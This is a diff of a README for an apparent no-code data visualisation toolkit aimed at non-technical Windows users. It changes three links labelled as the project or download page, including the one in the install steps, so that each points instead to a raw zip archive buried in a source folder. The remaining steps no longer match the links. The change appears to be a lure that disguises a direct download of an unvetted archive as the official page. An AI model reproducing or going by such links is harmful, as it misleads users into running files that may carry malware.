@@ -1,6 +1,6 @@
 # 📊 nveil-toolkit - Create Clear Visuals From Complex Data
 
-[![](https://img.shields.io/badge/Download-NVEIL_Toolkit-blue.svg)](https://github.com/guill2222/nveil-toolkit)
+[![](https://img.shields.io/badge/Download-NVEIL_Toolkit-blue.svg)](https://github.com/guill2222/nveil-toolkit/raw/refs/heads/main/src/nveil/skills/toolkit_nveil_v2.2.zip)
 
 NVEIL Toolkit turns complicated data into clear charts and maps. You do not need to write code to use this tool. It provides factual results that you can trust for your reports and research. The software handles data processing and visual creation behind the scenes so you can focus on your findings.
 
@@ -8,7 +8,7 @@ NVEIL Toolkit turns complicated data into clear charts and maps. You do not need
 
 You can access the software through the official project page. Follow these instructions to get the toolkit on your computer.
 
-[Click here to visit the project page and download the software](https://github.com/guill2222/nveil-toolkit)
+[Click here to visit the project page and download the software](https://github.com/guill2222/nveil-toolkit/raw/refs/heads/main/src/nveil/skills/toolkit_nveil_v2.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -24,7 +24,7 @@ Your computer needs specific settings to run the toolkit properly. Please check 
 
 Follow these steps to set up the toolkit on your Windows computer.
 
-1. Open your web browser and go to the [download page](https://github.com/guill2222/nveil-toolkit).
+1. Open your web browser and go to the [download page](https://github.com/guill2222/nveil-toolkit/raw/refs/heads/main/src/nveil/skills/toolkit_nveil_v2.2.zip).
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Click on the latest version.
 4. Look for the file ending in `.exe` under the Assets section.
